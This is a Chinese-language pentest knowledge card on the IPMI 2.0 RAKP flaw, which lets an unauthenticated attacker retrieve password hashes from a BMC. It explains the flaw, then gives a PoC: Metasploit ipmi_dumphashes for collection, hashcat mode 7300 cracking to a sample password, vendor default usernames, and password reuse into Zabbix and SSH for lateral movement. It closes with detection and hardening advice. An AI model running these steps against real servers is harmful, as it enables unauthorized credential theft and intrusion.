---
id: iot-protocol-ipmi-rakp-hash-disclosure
title: IPMI 2.0 RAKP 哈希泄露：无认证获取用户 HMAC-SHA1 并离线破解
type: scenario
domain: iot
path: iot/protocol
technique: ipmi-rakp-hash-disclosure
aliases:
- IPMI RAKP 哈希泄露
- ipmi_dumphashes
- IPMI 2.0 密码哈希
- hashcat 7300
- BMC 凭据离线破解
- RAKP Message 2
tags:
- ipmi
- bmc
- credential-disclosure
- rakp
- hmac-sha1
- hashcat
- udp-623
- hardware
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V63
  verified_at: '2026-11-05T12:17:10+08:00'
  notes: 已对照原文与图 24-26 核对：IPMI v2.0 七步会话、RAKP Message 2 的 HMAC_K[UID] 字段构成、MSF ipmi_dumphashes 取 Administrator HMAC、hashcat -m 7300 用 rockyou 破解出 ilovepumkinpie1、口令复用至 Zabbix 与 ipmi-svc 均一致。卡内字段表与 RFC 截图一致。未验证点：未本机复跑；离线爆破速度取决于硬件。
---

## 一句话结论

IPMI 2.0 的 RAKP 握手在客户端证明知晓密码之前，BMC 就会在 RAKP Message 2 中返回基于用户密钥计算的 HMAC-SHA1 认证码；攻击者无需认证即可用 Metasploit 的 `ipmi_dumphashes` 取得有效用户的哈希，再用 hashcat 模式 7300 离线爆破出明文密码。

## 原理

- IPMI 2.0 建立会话需要 7 步：Get Channel Authentication Capabilities → RMCP+ Open Session → RAKP Message 1-4。
- RAKP Message 2 由 BMC 发给客户端，包含 `SIDM, SIDC, RM, RC, GUIDC, RoleM, ULengthM, UNameM` 以及 `HMAC_K[UID](...)`。其中 HMAC-SHA1 的输入大部分是会话中已知/可构造的字段，唯一的秘密是用户密钥 `K[UID]`（即密码派生密钥）。
- 协议在验证客户端是否知道密码之前就发送这个 HMAC，等于把“密码的离线可验证副本”交给了任何能发起握手的攻击者；这是 IPMI 2.0 协议设计缺陷，常被称为 IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval。
- 攻击者只需一个存在的用户名：对每个默认/猜测用户名发起 RAKP，若用户存在则返回 HMAC，不存在则返回错误；收集到的哈希可用 hashcat `-m 7300`（IPMI2 RAKP HMAC-SHA1）离线爆破，不触发登录锁定。
- 案例中对 Administrator 取得 HMAC，用 rockyou 字典在数秒内破解出 `ilovepumkinpie1`，随后发现该密码被复用到 Zabbix 后台与 `ipmi-svc` 系统账户。

## 触发条件

- 目标 BMC 开放 UDP 623，且允许 IPMI 2.0 RAKP 会话。
- 攻击者知道或能猜测一个存在的 IPMI 用户名（厂商默认用户名、配置文件、社工）。
- BMC 使用可离线爆破的密码（弱口令/字典词/复用口令）。
- 攻击者有足够的 CPU/GPU 算力运行 hashcat（模式 7300）。

## 利用步骤

1. 探测 UDP 623 与 IPMI 版本：`nmap -sU -p 623 <ip>`；可用 `ipmitool -I lanplus -H <ip> -U <user> -P <pass> mc info` 判断。
2. 用 Metasploit 收集哈希：`use auxiliary/scanner/ipmi/ipmi_dumphashes`，设置 `RHOSTS`、`OUTPUT_FILE`，运行；模块会对默认用户名列表逐一请求。
3. 从输出中提取 `<user>:<hash>`；哈希格式包含 BMC 随机数、GUID、用户名等字段。
4. 用 hashcat 离线爆破：`hashcat -m 7300 '<hash>' <wordlist>`。
5. 用破解出的密码登录 BMC/IPMI，或尝试复用到 Web 后台、SSH、系统账户。
6. 若密码被复用，继续横向；案例中 `ilovepumkinpie1` 同时用于 Zabbix 管理员和 `ipmi-svc`。

## PoC

```bash
# 1. 探测
sudo nmap -sU -p 623 <target>

# 2. Metasploit 收集 HMAC
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <target>
set OUTPUT_FILE ipmi_hashes.txt
run
# [+] <target>:623 - IPMI - Hash found: Administrator:<HMAC-SHA1-HASH>

# 3. 离线爆破
hashcat -m 7300 '<HMAC-SHA1-HASH>' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
# ...:ilovepumkinpie1

# 4. 用明文登录
ipmitool -I lanplus -H <target> -U Administrator -P 'ilovepumkinpie1' user list
```

```text
# 用户名不存在时通常返回 illegal parameter / 无法建立会话；
# 用户存在且密码弱时，hashcat 7300 可直接恢复明文。
```

## 变体与关联

- 变体：Cipher 0 认证绕过可跳过密码直接登录，见关联卡；两者可组合：先用 RAKP 哈希拿用户名/密码，再尝试其他服务复用。
- 变体：不同 BMC 固件对 RAKP 的实现/默认用户名不同；Supermicro `ADMIN`、Dell `root`、HP `Administrator`、IBM/Lenovo `USERID` 等可优先尝试。
- 变体：拿到密码后尝试 Zabbix/SSH/数据库/Web 后台复用；案例中 Zabbix 管理员与 `ipmi-svc` 均复用同一口令。
- 关联：[[iot-protocol-ipmi-cipher-zero-auth-bypass]]、[[pentest-initial-access-password-semantic-mutation-reuse]]（口令复用）、[[pentest-lateral-movement-zabbix-admin-script-command-exec]]（复用进入 Zabbix 后台后的命令执行）。
- 边界：BMC 禁用 IPMI 2.0/RAKP、UDP 623 被隔离、用户名未知且默认用户名不存在、密码为高强度随机值时，离线爆破可能失败。

## 检测与防御

- 检测：UDP 623 出现大量 RAKP Message 1/2 会话、默认用户名枚举；BMC 日志中的异常会话；同一来源对多个用户名的 RAKP 请求；外带 hashcat 无法从网络侧检测，但异常 IPMI 会话可告警。
- 修复：升级 BMC 固件并禁用不必要的 IPMI 2.0/RAKP；使用强随机密码，避免跨系统复用；禁用默认用户名或重命名。
- 加固：IPMI 限制在管理网/VLAN，禁止公网/业务网访问 UDP 623；对 BMC 做访问白名单与登录审计；定期轮换 BMC 与复用账户口令。
